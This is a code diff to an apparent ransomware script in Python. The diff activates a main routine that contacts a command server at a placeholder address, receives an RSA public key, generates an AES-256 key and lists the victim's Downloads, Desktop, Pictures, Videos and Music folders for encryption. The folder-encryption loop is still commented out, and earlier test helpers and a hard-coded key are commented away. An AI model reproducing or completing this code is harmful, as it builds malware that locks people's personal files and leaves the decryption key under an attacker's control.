@@ -3,6 +3,7 @@ import pathlib
 from cryptography.hazmat.primitives import serialization
 from file import File
 #import secrets
+#import rsa
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import os
 
@@ -35,34 +36,44 @@ def decrypt_all_files_in_directory(path, AES_key):
     for file in all_files:
         file.decrypt_file(AES_key)
 
-# def main():
-#     print("now starting main....")
-#     server_public_ip = "SERVER_PUBLIC_IP"
-#     port = 8080
-#
-#     server_sock = connect_to_server(server_public_ip, port)
-#     public_key_bytes = server_sock.recv(4096)
-#     rsa_public_key = serialization.load_pem_public_key(public_key_bytes)
-#
-#     AES_key_256 = AESGCM.generate_key(bit_length=256)
-#     #nonce = os.urandom(12)
-#
-#     encrypt_all_files_in_directory(path, AES_key_256)
+def main():
+    print("now starting main....")
+    server_public_ip = "SERVER_PUBLIC_IP"
+    port = 8080
+
+    server_sock = connect_to_server(server_public_ip, port)
+    public_key_bytes = server_sock.recv(4096)
+    rsa_public_key = serialization.load_pem_public_key(public_key_bytes)
 
 
-def test_encrpytion(path, key):
-    encrypt_all_files_in_directory(path, key)
+    AES_key_256 = AESGCM.generate_key(bit_length=256)
 
-def test_decryption(path, key):
-    decrypt_all_files_in_directory(path, key)
+    base_path = pathlib.Path.home()
+
+    path_additions = [
+        "Downloads", "Desktop", "Pictures", "Videos", "Music"]
+
+    # for folder in path_additions:
+    #     path = base_path / folder
+    #     try:
+    #         encrypt_all_files_in_directory(path, AES_key_256)
+    #     except Exception as e:
+    #         print(f"Something went wrong with {path}: {e}")
+
+
+# def test_encrpytion(path, key):
+#     encrypt_all_files_in_directory(path, key)
+#
+# def test_decryption(path, key):
+#     decrypt_all_files_in_directory(path, key)
 
 
 if __name__ == "__main__":
     #key = AESGCM.generate_key(bit_length=256)
-    key = b'?\x96\xf1\xa2\xa9\x82\xcf!\x0cm\n\xa7\x00\x1c\x9b\x84\x89k#X|R\xe0d\'\xdaa"H\x1d\x9b\xae'
+    #key = b'?\x96\xf1\xa2\xa9\x82\xcf!\x0cm\n\xa7\x00\x1c\x9b\x84\x89k#X|R\xe0d\'\xdaa"H\x1d\x9b\xae'
     #print(key)
-    path = r"C:\Users\ariel\encryption_test"
+    #path = r"C:\Users\ariel\encryption_test"
     #test_encrpytion(path, key)
-    test_decryption(path, key)
-    #main()
+    #test_decryption(path, key)
+    main()
 
